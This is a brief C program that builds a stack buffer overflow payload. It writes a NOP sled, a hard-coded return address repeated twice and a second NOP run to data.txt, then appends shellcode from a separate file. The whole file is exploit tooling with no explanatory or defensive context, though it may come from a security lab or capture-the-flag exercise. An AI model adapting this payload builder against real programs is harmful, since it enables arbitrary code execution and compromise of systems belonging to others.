#include <stdio.h>

int main(int argc, const char * argv[]) {
	FILE * fp = fopen("data.txt", "w");
	void * codeAddress = (void *)0xffffd365;
	const char * addrData = (const char *)&codeAddress;
	int i;
	for (i = 0; i < 0x48; i++) {
		fprintf(fp, "%c", 0x90);
	}
	fwrite(addrData, 4, 1, fp);
	fwrite(addrData, 4, 1, fp);
	for (i = 0; i < 512; i++) {
		fprintf(fp, "%c", 0x90);
	}
	fclose(fp);
	// copy the shellcode
	system("cat shellcode >>data.txt");
	return 0;
}
